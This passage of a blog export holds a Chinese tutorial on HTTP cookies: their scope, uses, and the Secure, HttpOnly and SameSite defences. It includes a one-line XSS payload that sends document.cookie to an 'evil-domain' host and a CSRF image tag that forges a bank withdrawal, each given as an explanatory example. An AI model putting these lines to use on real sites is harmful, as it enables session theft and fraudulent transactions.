标识定义了cookie的作用域：即cookie应该发送给哪些URL。\nDomain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（**不包含子域名**）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。\n\n## Cookie作用及用途\n\n### Cookie的作用\n\n**存储个性化设置**\n即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。\n<div style=\"width: 80%; margin: 0 auto; text-align: center\">\n\t![在主页的cookie](out-path-cookie.png)\n</br>\n  在google.com的cookie\n</br>\n  ![在搜索的cookie](in-path-cookie.png)\n</br>\n  在google.com/search的cookie\n</br>\n</div>\n\n正因为cookie的作用域，使得cookie存储有着多样性。\n\n**存储未登陆时用户唯一标识**\n\n在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。\n具体操作：\n1、向未登陆的用户发送一个唯一的标识。\n2、保留唯一标识所做的事情。\n3、用户登录后关联账户及唯一标识所做的事情。\n\n以新浪微博为例：\n<div style=\"width: 80%; margin: 0 auto; text-align: center\">\n![未登陆状态下的cookie](unlogin-cookie.png)\n</br>\n未登录状态下的cookie：login_sid_t表示唯一标识\n</div>\n\n通过唯一标识与登录态的绑定，可建立游客态与用户态的关联\n\n**存储已经登陆用户的凭证**\ncookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。\n\n**存储其他业务数据**\n可存储其他业务信息，例如用户生日等\n\n### Cookie的用途\n\n了解Cookie的作用后，其主要用途是以下三个方面：\n\n- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）\n- 个性化设置（如用户自定义设置、主题等）\n- 浏览器行为跟踪（如跟踪分析用户行为等）\n\n## Cookie 的安全策略\n\n### Cookie与XSS的关系\n\n在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码\n```javascript\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n这种情况下的cookie则会发送到攻击者的网站。\n\n#### 分析XSS攻击：\n\n* 会话被劫持\n* 通过document获取cookie\n\n#### 解决办法：\n\n* 会话劫持：使用cookie中Secure标识\n* 不被JavaScript调用cookie：使用cookie中HttpOnly标识\n\n#### 参数介绍\n\n**Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）**\n\n> 一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。\n\n用法：\n\n```javascript\nSet-Cookie: name=gdccwxx; secure\n```\n\n**HttpOnly**\n\n> 设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  `Document.cookie` 属性、`XMLHttpRequest` 和  `Request`APIs 进行访问，以防范跨站脚本攻击（XSS）。\n\n用法：\n\n```javascript\nSet-Cookie: name=gdccwxx; HttpOnly\n```\n\n### Cookie与CSRF的关系\n\nCSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。\n以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：\n```html\n<img src=\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\">\n```\n\n这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。\n\n#### 分析CSRF攻击\n\n* 被攻击者本地Cookie信息没有过期\n* 银行转账系统无二次确认，直接转账\n* 第三方网站（不安全的聊天室或论坛）加载请求\n* 攻击者无法读写Cookie\n\n#### 解决办法\n\n* 敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间\n* 增加二次确认：目标网站对敏感操作无二次确认\n* 不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。\n* 允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识\n\n#### 参数介绍\n\n**SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）**\n\n> 允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。\n\n用法：\n\n```javascript\nSet-Cookie: name=gdccwxx; SameSite // default SameSite=Strict\nSet-Cookie: name=gdccwxx; SameSite=Lax\n```\n\n| **请求类型** | **例子**                          | **非 SameSit** | **SameSite = Lax** | **SameSite = Strict** |\n| :----------- | --------------------------------- | -------------- | ------------------ | --------------------- |\n| link         | <a href=\"…\"\\>                     | Y              | Y                  | N                     |\n| prerender    | \\<link rel=\"prerender\" href=\"…\"\\> | Y              | Y                  | N                     |\n| form get     | <form method=\"get\" action=\"…\"\\>   | Y              | Y                  | N                     |\n| form post    | <form method=\"post\" action=\"…\"\\>  | Y              | N                  | N                     |\n| iframe       | <iframe src=\"…\"\\>                 | Y              | N                  | N                     |\n| ajax         | $.get('…')                        | Y              | N                  | N                     |\n| image        | <img src=\"…\"\\>                    | Y              | N                  | N                     |\n\n\n\n## 要点总结：\n\n* **Cookie是服务器保存在本地的数据块**\n* **每次请求都会包含cookie，因此会比较浪费资源**\n* **使用document.cookie可访问非HttpOnly的cookie**\n* **删除本地cookie只能通过给cookie设置过去的Expire删除**\n* **常用鉴别用户身份的方法是给cookie设置签名或token**\n* **为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer**","source":"_posts/basic-cookies.md","raw":"---\ntitle: 管中窥豹看Cookie\ndate: 2019-04-09 21:14:04\ntags: http\ndir: http\nkeywords:\n  - http\n  - cookie\n---\n\n本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的[详细参数](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)。\n\n## Cookie介绍\n\n以下Wikipedia、MDN对cookie的介绍\n\n> **Wikipedia:**\n>\n> Cookie（复数形态Cookies），又称为“小甜饼”。类型为“**小型文本文件**”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。\n>\n> **MDN:**\n>\n> HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。\n\n**划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态**\n\nCookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。\n\n<div style=\"width: 80%; margin: 0 auto;text-align:center\">![cookies消息传递](exchange-cookies.png)Cookies的传输</div>\n\n**注意**：_Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。_\n\n\n## Cookie的特性\n\n### 前端数据存储及读写\n\nCookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie\n[document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)\n```javascript\n// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式\n// 可设置path，domain，max-age，expires，secure\n\n// 增加cookie\ndocument.cookie = `someCookieName=true; expires=${new Date().toGMTString() + 1}; path=/`\n// 删除cookie 通过设置过去的时间删除cookie\ndocument.cookie = `someCookieName=true; expires=${new Date().toGMTString() - 1}; path=/`\n// 修改cookie\ndocument.cookie = `someCookieName=false; expires=${new Date().toGMTString() + 1}; path=/`\n// 查找cookie\nnew RegExp(\"(?:^|;\\\\s*)\" + encodeURIComponent(\"需要查找的cookie\").replace(/[-.+*]/g, \"\\\\$&\") + \"\\\\s*\\\\=\")).test(document.cookie)\n```\n\n### 后端通过http头设置\n\n后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie[参数](https://github.com/pillarjs/cookies)\n```javascript\n// 以nodejs为例\n// 获取\nresponse.getHeader(\"Cookie\");\n// 设置\nresponse.setHeader(\"Cookie\", [\"name=gdccwxx\"]);\n\n// 以koa为例\n// 获取\nctx.cookies.get(name, [options])\n// 设置\nctx.cookies.set(name, value, [options])\n```\n\n### 请求时通过http头传给后端\n\n以Google键入请求为例\n<div style=\"width: 80%; margin: 0 auto;text-align:center\">![请求Google](font-transfer-cookie.png)请求通过http头传送给后端</div>\n\n### 遵守同源策略\n\nDomain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。\nDomain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（**不包含子域名**）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。\n\n## Cookie作用及用途\n\n### Cookie的作用\n\n**存储个性化设置**\n即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。\n<div style=\"width: 80%; margin: 0 auto; text-align: center\">\n\t![在主页的cookie](out-path-cookie.png)\n</br>\n  在google.com的cookie\n</br>\n  ![在搜索的cookie](in-path-cookie.png)\n</br>\n  在google.com/search的cookie\n</br>\n</div>\n\n正因为cookie的作用域，使得cookie存储有着多样性。\n\n**存储未登陆时用户唯一标识**\n\n在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。\n具体操作：\n1、向未登陆的用户发送一个唯一的标识。\n2、保留唯一标识所做的事情。\n3、用户登录后关联账户及唯一标识所做的事情。\n\n以新浪微博为例：\n<div style=\"width: 80%; margin: 0 auto; text-align: center\">\n![未登陆状态下的cookie](unlogin-cookie.png)\n</br>\n未登录状态下的cookie：login_sid_t表示唯一标识\n</div>\n\n通过唯一标识与登录态的绑定，可建立游客态与用户态的关联\n\n**存储已经登陆用户的凭证**\ncookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。\n\n**存储其他业务数据**\n可存储其他业务信息，例如用户生日等\n\n### Cookie的用途\n\n了解Cookie的作用后，其主要用途是以下三个方面：\n\n- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）\n- 个性化设置（如用户自定义设置、主题等）\n- 浏览器行为跟踪（如跟踪分析用户行为等）\n\n## Cookie 的安全策略\n\n### Cookie与XSS的关系\n\n在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码\n```javascript\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n这种情况下的cookie则会发送到攻击者的网站。\n\n#### 分析XSS攻击：\n\n* 会话被劫持\n* 通过document获取cookie\n\n#### 解决办法：\n\n* 会话劫持：使用cookie中Secure标识\n* 不被JavaScript调用cookie：使用cookie中HttpOnly标识\n\n#### 参数介绍\n\n**Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）**\n\n> 一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。\n\n用法：\n\n```javascript\nSet-Cookie: name=gdccwxx; secure\n```\n\n**HttpOnly**\n\n> 设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  `Document.cookie` 属性、`XMLHttpRequest` 和  `Request`APIs 进行访问，以防范跨站脚本攻击（XSS）。\n\n用法：\n\n```javascript\nSet-Cookie: name=gdccwxx; HttpOnly\n```\n\n### Cookie与CSRF的关系\n\nCSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。\n以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：\n```html\n<img src=\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\">\n```\n\n这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。\n\n#### 分析CSRF攻击\n\n* 被攻击者本地Cookie信息没有过期\n* 银行转账系统无二次确认，直接转账\n* 第三方网站（不安全的聊天室或论坛）加载请求\n* 攻击者无法读写Cookie\n\n#### 解决办法\n\n* 敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间\n* 增加二次确认：目标网站对敏感操作无二次确认\n* 不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。\n* 允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识\n\n#### 参数介绍\n\n**SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）**\n\n> 允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。\n\n用法：\n\n```javascript\nSet-Cookie: name=gdccwxx; SameSite // default SameSite=Strict\nSet-Cookie: name=gdccwxx; SameSite=Lax\n```\n\n| **请求类型** | **例子**                          | **非 SameSit** | **SameSite = Lax** | **SameSite = Strict** |\n| :----------- | --------------------------------- | -------------- | ------------------ | --------------------- |\n| link         | <a href=\"…\"\\>                     | Y              | Y                  | N                     |\n| prerender    | \\<link rel=\"prerender\" href=\"…\"\\> | Y              | Y                  | N                     |\n| form get     | <form method=\"get\" action=\"…\"\\>   | Y              | Y                  | N                     |\n| form post    | <form method=\"post\" action=\"…\"\\>  | Y              | N                  | N                     |\n| iframe       | <iframe src=\"…\"\\>                 | Y              | N                  | N                     |\n| ajax         | $.get('…')                        | Y              | N                  | N                     |\n| image        | <img src=\"…\"\\>                    | Y              | N                  | N                     |\n\n\n\n## 要点总结：\n\n* **Cookie是服务器保存在本地的数据块**\n* **每次请求都会包含cookie，因此会比较浪费资源**\n* **使用document.cookie可访问非HttpOnly的cookie**\n* **删除本地cookie只能通过给cookie设置过去的Expire删除**\n* **常用鉴别用户身份的方法是给cookie设置签名或token**\n* **为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer**","slug":"basic-cookies","published":1,"updated":"2021-10-13T15:48:33.804Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz01000i4jzxbifvpztm","content":"<p>本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies\" target=\"_blank\" rel=\"noopener\">详细参数</a>。</p><h2 id=\"Cookie介绍\"><a href=\"#Cookie介绍\" class=\"headerlink\" title=\"Cookie介绍\"></a>Cookie介绍</h2><p>以下Wikipedia、MDN对cookie的介绍</p><blockquote><p><strong>Wikipedia:</strong></p><p>Cookie（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p><p><strong>MDN:</strong></p><p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p></blockquote><p><strong>划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态</strong></p><p>Cookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。</p><div style=\"width:80%;margin:0 auto;text-align:center\"><img src=\"/img/loading.gif\" data-original=\"/http/basic-cookies/exchange-cookies.png\" alt=\"cookies消息传递\">Cookies的传输</div><p><strong>注意</strong>：<em>Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。</em></p><h2 id=\"Cookie的特性\"><a href=\"#Cookie的特性\" class=\"headerlink\" title=\"Cookie的特性\"></a>Cookie的特性</h2><h3 id=\"前端数据存储及读写\"><a href=\"#前端数据存储及读写\" class=\"headerlink\" title=\"前端数据存储及读写\"></a>前端数据存储及读写</h3><p>Cookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie<br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie\" target=\"_blank\" rel=\"noopener\">document.cookie</a><br></p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式</span></span><br><span class=\"line\"><span class=\"comment\">// 可设置path，domain，max-age，expires，secure</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 增加cookie</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.cookie = <span class=\"string\">`someCookieName=true; expires=<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().toGMTString() + <span class=\"number\">1</span>&#125;</span>; path=/`</span></span><br><span class=\"line\"><span class=\"comment\">// 删除cookie 通过设置过去的时间删除cookie</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.cookie = <span class=\"string\">`someCookieName=true; expires=<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().toGMTString() - <span class=\"number\">1</span>&#125;</span>; path=/`</span></span><br><span class=\"line\"><span class=\"comment\">// 修改cookie</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.cookie = <span class=\"string\">`someCookieName=false; expires=<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().toGMTString() + <span class=\"number\">1</span>&#125;</span>; path=/`</span></span><br><span class=\"line\"><span class=\"comment\">// 查找cookie</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">\"(?:^|;\\\\s*)\"</span> + <span class=\"built_in\">encodeURIComponent</span>(<span class=\"string\">\"需要查找的cookie\"</span>).replace(<span class=\"regexp\">/[-.+*]/g</span>, <span class=\"string\">\"\\\\$&amp;\"</span>) + <span class=\"string\">\"\\\\s*\\\\=\"</span>)).test(<span class=\"built_in\">document</span>.cookie)</span><br></pre></td></tr></table></figure><p></p><h3 id=\"后端通过http头设置\"><a href=\"#后端通过http头设置\" class=\"headerlink\" title=\"后端通过http头设置\"></a>后端通过http头设置</h3><p>后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie<a href=\"https://github.com/pillarjs/cookies\" target=\"_blank\" rel=\"noopener\">参数</a><br></p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 以nodejs为例</span></span><br><span class=\"line\"><span class=\"comment\">// 获取</span></span><br><span class=\"line\">response.getHeader(<span class=\"string\">\"Cookie\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设置</span></span><br><span class=\"line\">response.setHeader(<span class=\"string\">\"Cookie\"</span>, [<span class=\"string\">\"name=gdccwxx\"</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 以koa为例</span></span><br><span class=\"line\"><span class=\"comment\">// 获取</span></span><br><span class=\"line\">ctx.cookies.get(name, [options])</span><br><span class=\"line\"><span class=\"comment\">// 设置</span></span><br><span class=\"line\">ctx.cookies.set(name, value, [options])</span><br></pre></td></tr></table></figure><p></p><h3 id=\"请求时通过http头传给后端\"><a href=\"#请求时通过http头传给后端\" class=\"headerlink\" title=\"请求时通过http头传给后端\"></a>请求时通过http头传给后端</h3><p>以Google键入请求为例</p><div style=\"width:80%;margin:0 auto;text-align:center\"><img src=\"/img/loading.gif\" data-original=\"/http/basic-cookies/font-transfer-cookie.png\" alt=\"请求Google\">请求通过http头传送给后端</div><h3 id=\"遵守同源策略\"><a href=\"#遵守同源策略\" class=\"headerlink\" title=\"遵守同源策略\"></a>遵守同源策略</h3><p>Domain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。<br>Domain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（<strong>不包含子域名</strong>）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。</p><h2 id=\"Cookie作用及用途\"><a href=\"#Cookie作用及用途\" class=\"headerlink\" title=\"Cookie作用及用途\"></a>Cookie作用及用途</h2><h3 id=\"Cookie的作用\"><a href=\"#Cookie的作用\" class=\"headerlink\" title=\"Cookie的作用\"></a>Cookie的作用</h3><p><strong>存储个性化设置</strong><br>即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。</p><div style=\"width:80%;margin:0 auto;text-align:center\"><br><img src=\"/img/loading.gif\" data-original=\"/http/basic-cookies/out-path-cookie.png\" alt=\"在主页的cookie\"><br><br><br>在google.com的cookie<br><br><br><img src=\"/img/loading.gif\" data-original=\"/http/basic-cookies/in-path-cookie.png\" alt=\"在搜索的cookie\"><br><br><br>在google.com/search的cookie<br><br><br></div><p>正因为cookie的作用域，使得cookie存储有着多样性。</p><p><strong>存储未登陆时用户唯一标识</strong></p><p>在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。<br>具体操作：<br>1、向未登陆的用户发送一个唯一的标识。<br>2、保留唯一标识所做的事情。<br>3、用户登录后关联账户及唯一标识所做的事情。</p><p>以新浪微博为例：</p><div style=\"width:80%;margin:0 auto;text-align:center\"><br><img src=\"/img/loading.gif\" data-original=\"/http/basic-cookies/unlogin-cookie.png\" alt=\"未登陆状态下的cookie\"><br><br><br>未登录状态下的cookie：login_sid_t表示唯一标识<br></div><p>通过唯一标识与登录态的绑定，可建立游客态与用户态的关联</p><p><strong>存储已经登陆用户的凭证</strong><br>cookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。</p><p><strong>存储其他业务数据</strong><br>可存储其他业务信息，例如用户生日等</p><h3 id=\"Cookie的用途\"><a href=\"#Cookie的用途\" class=\"headerlink\" title=\"Cookie的用途\"></a>Cookie的用途</h3><p>了解Cookie的作用后，其主要用途是以下三个方面：</p><ul><li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li>个性化设置（如用户自定义设置、主题等）</li><li>浏览器行为跟踪（如跟踪分析用户行为等）</li></ul><h2 id=\"Cookie-的安全策略\"><a href=\"#Cookie-的安全策略\" class=\"headerlink\" title=\"Cookie 的安全策略\"></a>Cookie 的安全策略</h2><h3 id=\"Cookie与XSS的关系\"><a href=\"#Cookie与XSS的关系\" class=\"headerlink\" title=\"Cookie与XSS的关系\"></a>Cookie与XSS的关系</h3><p>在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码<br></p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"keyword\">new</span> Image()).src = <span class=\"string\">\"http://www.evil-domain.com/steal-cookie.php?cookie=\"</span> + <span class=\"built_in\">document</span>.cookie;</span><br></pre></td></tr></table></figure><p></p><p>这种情况下的cookie则会发送到攻击者的网站。</p><h4 id=\"分析XSS攻击：\"><a href=\"#分析XSS攻击：\" class=\"headerlink\" title=\"分析XSS攻击：\"></a>分析XSS攻击：</h4><ul><li>会话被劫持</li><li>通过document获取cookie</li></ul><h4 id=\"解决办法：\"><a href=\"#解决办法：\" class=\"headerlink\" title=\"解决办法：\"></a>解决办法：</h4><ul><li>会话劫持：使用cookie中Secure标识</li><li>不被JavaScript调用cookie：使用cookie中HttpOnly标识</li></ul><h4 id=\"参数介绍\"><a href=\"#参数介绍\" class=\"headerlink\" title=\"参数介绍\"></a>参数介绍</h4><p><strong>Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）</strong></p><blockquote><p>一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。</p></blockquote><p>用法：</p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Set</span>-Cookie: name=gdccwxx; secure</span><br></pre></td></tr></table></figure><p><strong>HttpOnly</strong></p><blockquote><p>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由 <code>Document.cookie</code> 属性、<code>XMLHttpRequest</code> 和 <code>Request</code>APIs 进行访问，以防范跨站脚本攻击（XSS）。</p></blockquote><p>用法：</p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Set</span>-Cookie: name=gdccwxx; HttpOnly</span><br></pre></td></tr></table></figure><h3 id=\"Cookie与CSRF的关系\"><a href=\"#Cookie与CSRF的关系\" class=\"headerlink\" title=\"Cookie与CSRF的关系\"></a>Cookie与CSRF的关系</h3><p>CSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。<br>以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<br></p><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><p>这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。</p><h4 id=\"分析CSRF攻击\"><a href=\"#分析CSRF攻击\" class=\"headerlink\" title=\"分析CSRF攻击\"></a>分析CSRF攻击</h4><ul><li>被攻击者本地Cookie信息没有过期</li><li>银行转账系统无二次确认，直接转账</li><li>第三方网站（不安全的聊天室或论坛）加载请求</li><li>攻击者无法读写Cookie</li></ul><h4 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h4><ul><li>敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间</li><li>增加二次确认：目标网站对敏感操作无二次确认</li><li>不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。</li><li>允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识</li></ul><h4 id=\"参数介绍-1\"><a href=\"#参数介绍-1\" class=\"headerlink\" title=\"参数介绍\"></a>参数介绍</h4><p><strong>SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）</strong></p><blockquote><p>允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。</p></blockquote><p>用法：</p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Set</span>-Cookie: name=gdccwxx; SameSite <span class=\"comment\">// default SameSite=Strict</span></span><br><span class=\"line\"><span class=\"built_in\">Set</span>-Cookie: name=gdccwxx; SameSite=Lax</span><br></pre></td></tr></table></figure><table><thead><tr><th style=\"text-align:left\"><strong>请求类型</strong></th><th><strong>例子</strong></th><th><strong>非 SameSit</strong></th><th><strong>SameSite = Lax</strong></th><th><strong>SameSite = Strict</strong></th></tr></thead><tbody><tr><td style=\"text-align:left\">link</td><td>&lt;a href=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style=\"text-align:left\">prerender</td><td>\\&lt;link rel=”prerender” href=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style=\"text-align:left\">form get</td><td>&lt;form method=”get” action=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style=\"text-align:left\">form post</td><td>&lt;form method=”post” action=”…”></td><td>Y</td><td>N</td><td>N</td></tr><tr><td style=\"text-align:left\">iframe</td><td>&lt;iframe src=”…”></td><td>Y</td><td>N</td><td>N</td></tr><tr><td style=\"text-align:left\">ajax</td><td>$.get(‘…’)</td><td>Y</td><td>N</td><td>N</td></tr><tr><td style=\"text-align:left\">image</td><td>&lt;img 